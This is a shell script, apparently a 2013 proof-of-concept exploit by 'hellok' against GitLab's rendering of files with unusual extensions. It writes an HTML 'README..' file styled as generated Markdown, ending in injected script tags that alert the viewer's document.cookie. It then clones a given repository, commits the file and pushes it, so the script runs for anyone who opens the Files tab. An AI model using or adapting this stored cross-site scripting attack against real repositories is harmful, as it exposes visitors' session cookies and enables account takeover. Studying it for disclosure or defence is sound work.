#!/bin/sh
#author hellok
#for file format ext pwn for gitlab 12/16/2013


tee README.. > /dev/null <<'EOF'
<!-- Markdown Source -->
<!--
-->
<html>
<head>
<title>README. [Generated]</title>
<style>

/* Taken from QLMarkdown: https://github.com/toland/qlmarkdown */
/* Extracted and interpreted from adcstyle.css and frameset_styles.css */

/* body */
body {
margin: 20px 40px;
background-color: #fff;
color: #000;
font: 13px "Myriad Pro", "Lucida Grande", Lucida, Verdana, sans-serif;
}

/* links */
a:link {
color: #00f;
text-decoration: none;
}

a:visited {
color: #00a;
text-decoration: none;
}

a:hover {
color: #f60;
text-decoration: underline;
}

a:active {
color: #f60;
text-decoration: underline;
}


/* html tags */

/*  Work around IE/Win code size bug - courtesy Jesper, waffle.wootest.net  */

* html code	{
font-size: 101%;
}

* html pre {
font-size: 101%;
}

/* code */

pre, code {
font-size: 11px; font-family: monaco, courier, consolas, monospace;
}

pre {
margin-top: 5px;
margin-bottom: 10px;
border: 1px solid #c7cfd5;
background: #f1f5f9;
margin: 20px 0;
padding: 8px;
text-align: left;
}

hr {
color: #919699;
size: 1;
width: 100%;
noshade: "noshade"
}

/* headers */


h1, h2, h3, h4, h5, h6 {
font-family: "Myriad Pro", "Lucida Grande", Lucida, Verdana, sans-serif;
font-weight: bold;
}

h1	{
margin-top: 1em;
margin-bottom: 25px;
color: #000;
font-weight: bold;
font-size: 30px;
}
h2	{
margin-top: 2.5em;
font-size: 24px;
color: #000;
padding-bottom: 2px;
border-bottom: 1px solid #919699;
}
h3	{
margin-top: 2em;
margin-bottom: .5em;
font-size: 17px;
color: #000;
}
h4	{
margin-top: 2em;
margin-bottom: .5em;
font-size: 15px;
color: #000;
}
h5	{
margin-top: 20px;
margin-bottom: .5em;
padding: 0;
font-size: 13px;
color: #000;
}

h6	{
margin-top: 20px;
margin-bottom: .5em;
padding: 0;
font-size: 11px;
color: #000;
}

p {
margin-top: 0px;
margin-bottom: 10px;
}

/* lists */

ul	{
list-style: square outside;
margin: 0 0 0 30px;
padding: 0 0 12px 6px;
}

li	{
margin-top: 7px;
}

ol {
list-style-type: decimal;
list-style-position: outside;
margin: 0 0 0 30px;
padding: 0 0 12px 6px;
}

ol ol {
list-style-type: lower-alpha;
list-style-position: outside;
margin: 7px 0 0 30px;
padding: 0 0 0 10px;
}

ul ul {
margin-left: 40px;
padding: 0 0 0 6px;
}

li>p { display: inline }
li>p+p { display: block }
li>a+p { display: block }


/* table */

table {
border-top: 1px solid #919699;
border-left: 1px solid #919699;
border-spacing: 0;
}

table th {
padding: 4px 8px 4px 8px;
background: #E2E2E2;
font-size: 12px;
border-bottom: 1px solid #919699;
border-right: 1px solid #919699;
}
table th p {
font-weight: bold;
margin-bottom: 0px;
}

table td {
padding: 8px;
font-size: 12px;
vertical-align: top;
border-bottom: 1px solid #919699;
border-right: 1px solid #919699;
}
table td p {
margin-bottom: 0px;
}
table td p + p  {
margin-top: 5px;
}
table td p + p + p {
margin-top: 5px;
}

/* forms */

form {
margin: 0;
}

button {
margin: 3px 0 10px 0;
}
input {
vertical-align: middle;
padding: 0;
margin: 0 0 5px 0;
}

select {
vertical-align: middle;
padding: 0;
margin: 0 0 3px 0;
}

textarea {
margin: 0 0 10px 0;
width: 100%;
}
</style>
</head>
<body>
<b>README.</b> - Generated on <b>2013年12月 16日 星期日 16时50分57秒 CST</b> by <b>hellok</b> using <a href="">Markdown</a>. Source is embedded.
<hr>

</body>
<script>alert(/pwned by hellok,fresh cookie/)</script>
<script>alert(document.cookie)</script>
</html>
EOF


USAGE="$0: <git url>"
if [ $# -lt 1 ]; then echo "Error: git url is required.\n$USAGE" >&2; exit 1; fi
echo "pwn start"
git clone $1
echo $(basename $1 | awk -F "." '{ print $1 }')
cp README.. $(basename $1 | awk -F "." '{ print $1 "/"}')
cd $(basename $1 | awk -F "." '{ print $1 }')
git add *
git commit -m "1"
git push
echo "DONE!Open your gitlab's Files TAB"


